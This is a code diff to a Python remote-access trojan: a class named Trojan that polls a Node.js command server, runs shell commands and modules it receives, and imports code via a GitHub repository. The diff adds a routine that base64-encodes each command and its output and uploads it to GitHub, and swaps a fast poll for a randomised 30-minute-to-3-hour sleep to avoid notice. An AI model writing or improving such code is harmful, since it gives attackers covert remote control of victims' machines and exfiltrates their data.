@@ -2,6 +2,7 @@ import base64
 import github3
 import importlib
 import json
+import random
 import sys
 import threading
 import time
@@ -66,6 +67,15 @@ class Trojan:
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to update status on Node.js server: {e}")
 
+    def store_shell_command_result(self, command, result):
+        try:
+            message = f"shell_command_{datetime.now().isoformat()}"
+            remote_path = f'{self.data_path}{message}.data'
+            bindata = base64.b64encode(bytes(f'Command: {command}\nResult:\n{result}', 'utf-8'))
+            self.repo.create_file(remote_path, message, bindata)
+        except Exception as e:
+            print(f"Error storing shell command result to GitHub: {e}")
+
     def execute_command(self, command):
         if isinstance(command, dict):
             command_type = command.get('type')
@@ -79,6 +89,7 @@ class Trojan:
                     except subprocess.CalledProcessError as e:
                         result = e.output.decode('utf-8')
                     self.send_command_result(shell_command, result)
+                    self.store_shell_command_result(shell_command, result)  # Store result in GitHub
             elif command_type == 'module':
                 module_name = command.get('module')
                 if module_name:
@@ -101,6 +112,7 @@ class Trojan:
 
     def run(self):
         while self.running:
+            github_config = self.get_github_config()
             nodejs_config = self.get_nodejs_config()
 
             if nodejs_config:
@@ -112,7 +124,7 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-            time.sleep(5)  # Reduced sleep time for faster polling
+            time.sleep(random.randint(30*60, 3*60*60))
 
 class GitImporter:
     def __init__(self):
